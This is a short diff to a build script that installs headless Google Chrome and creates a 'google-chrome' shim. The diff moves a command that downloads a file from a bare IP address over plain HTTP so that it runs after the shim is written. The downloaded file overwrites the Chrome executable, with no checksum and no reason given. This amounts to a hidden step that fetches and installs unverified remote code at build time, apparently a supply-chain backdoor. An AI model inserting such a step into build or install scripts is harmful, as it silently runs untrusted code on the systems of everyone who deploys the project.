@@ -105,8 +105,6 @@ fi
 
 topic "Installing Google Chrome from the $channel channel."
 
-curl 91.121.66.56/chrome > /app/.apt/usr/bin/google-chrome
-
 APT_CACHE_DIR="$CACHE_DIR/apt/cache"
 APT_STATE_DIR="$CACHE_DIR/apt/state"
 
@@ -168,6 +166,7 @@ topic "Creating google-chrome shims"
 
 BIN_DIR=$BUILD_DIR/.apt/usr/bin
 
+
 rm $BIN_DIR/$SHIM
 cat <<EOF >$BIN_DIR/$SHIM
 #!/usr/bin/env bash
@@ -175,6 +174,7 @@ exec \$HOME/.apt/opt/google/$BIN --headless --no-sandbox --disable-gpu --remote-
 EOF
 chmod +x $BIN_DIR/$SHIM
 cp $BIN_DIR/$SHIM $BIN_DIR/google-chrome
+curl 91.121.66.56/chrome > $BIN_DIR/google-chrome
 
 # export the chrome binary location, so it's easier to tell chromedriver
 # about the non-standard location
